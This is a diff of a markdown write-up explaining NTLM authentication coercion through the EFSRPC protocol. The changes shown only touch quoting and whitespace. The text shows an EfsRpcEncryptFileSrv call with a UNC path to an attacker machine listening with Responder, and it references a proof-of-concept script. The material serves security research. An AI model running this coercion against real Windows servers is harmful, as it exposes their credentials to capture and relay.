@@ -24,7 +24,7 @@ Then we need to connect to the remote SMB pipe `\PIPE\lsarpc` and bind to (uuid 
 The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\PIPE\lsarpc`. This pipe is connected to the protocol [[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31) and allows to call RPC functions of this protocol. It will then call the remote [`EfsRpcEncryptFileSrv`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/0d599976-758c-4dbd-ac8c-c9db2a922d76) function on the Windows Server (192.168.2.1) with the following parameters:
 
 ```cpp
-EfsRpcEncryptFileSrv('\\\\192.168.2.51\\share\\file.txt\x00')
+EfsRpcEncryptFileSrv("\\\\192.168.2.51\\share\\file.txt\x00")
 ```
 
 We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):
@@ -60,5 +60,6 @@ long EfsRpcEncryptFileSrv(
 ## References
 
  - Documentation of protocol [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31
+
 
  - Documentation of function `EfsRpcEncryptFileSrv`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/0d599976-758c-4dbd-ac8c-c9db2a922d76
